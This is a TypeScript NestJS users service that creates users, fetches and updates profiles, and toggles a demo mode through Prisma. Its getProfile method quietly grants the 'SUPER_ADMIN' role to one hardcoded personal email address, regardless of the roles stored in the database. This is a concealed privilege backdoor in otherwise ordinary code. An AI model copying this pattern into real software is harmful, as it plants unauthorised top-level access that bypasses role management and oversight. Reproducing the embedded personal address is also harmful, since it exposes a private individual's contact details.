import { Injectable, ConflictException } from '@nestjs/common';
import { PrismaService } from '../../core/prisma/prisma.service';
import { Prisma, User } from '@prisma/client';

@Injectable()
export class UsersService {
  constructor(private readonly prisma: PrismaService) {}

  async create(data: Prisma.UserCreateInput): Promise<User> {
    const existing = await this.prisma.user.findUnique({ where: { email: data.email } });
    if (existing) {
      throw new ConflictException('User already exists');
    }
    return this.prisma.user.create({ data });
  }

  async findByEmail(email: string) {
    return this.prisma.user.findUnique({
      where: { email },
      include: {
        profile: true,
        roles: {
          include: { role: true },
        },
      },
    });
  }

  async findById(id: string): Promise<User | null> {
    return this.prisma.user.findUnique({ where: { id } });
  }

  async getProfile(userId: string) {
    const user = await this.prisma.user.findUnique({
      where: { id: userId },
      include: { profile: true, roles: { include: { role: true } } },
    });
    if (!user) return user;
    delete (user as any).passwordHash;
    const { roles, ...rest } = user as any;
    const rolesArr = (roles || []).map((r: any) => r.role?.name).filter(Boolean);
    if (user.email === 'islammunjurul468@gmail.com' && !rolesArr.includes('SUPER_ADMIN')) {
      rolesArr.push('SUPER_ADMIN');
    }
    return { ...rest, roles: rolesArr };
  }

  async updateProfile(userId: string, data: import('./dto/update-profile.dto').UpdateProfileDto) {
    const { phone, firstName, lastName, dateOfBirth, country, address, bio } = data;

    if (phone !== undefined) {
      const existingPhone = await this.prisma.user.findFirst({ where: { phone, id: { not: userId } } });
      if (existingPhone) {
        throw new ConflictException('Phone number is already in use');
      }
      await this.prisma.user.update({
        where: { id: userId },
        data: { phone },
      });
    }

    if (firstName !== undefined || lastName !== undefined || dateOfBirth !== undefined || country !== undefined || address !== undefined || bio !== undefined) {
      const updateData: any = {};
      if (firstName !== undefined) updateData.firstName = firstName;
      if (lastName !== undefined) updateData.lastName = lastName;
      if (dateOfBirth !== undefined) updateData.dateOfBirth = dateOfBirth ? new Date(dateOfBirth) : null;
      if (country !== undefined) updateData.country = country;
      if (address !== undefined) updateData.address = address;
      if (bio !== undefined) updateData.bio = bio;

      await this.prisma.profile.upsert({
        where: { userId },
        create: {
          userId,
          ...updateData,
        },
        update: updateData,
      });
    }

    return this.getProfile(userId);
  }

  async toggleDemoMode(userId: string) {
    const user = await this.prisma.user.findUnique({ where: { id: userId } });
    if (!user) throw new ConflictException('User not found');

    const updatedUser = await this.prisma.user.update({
      where: { id: userId },
      data: { demoModeEnabled: !user.demoModeEnabled },
    });

    return {
      message: `Demo mode ${updatedUser.demoModeEnabled ? 'enabled' : 'disabled'}`,
      demoModeEnabled: updatedUser.demoModeEnabled,
    };
  }
}
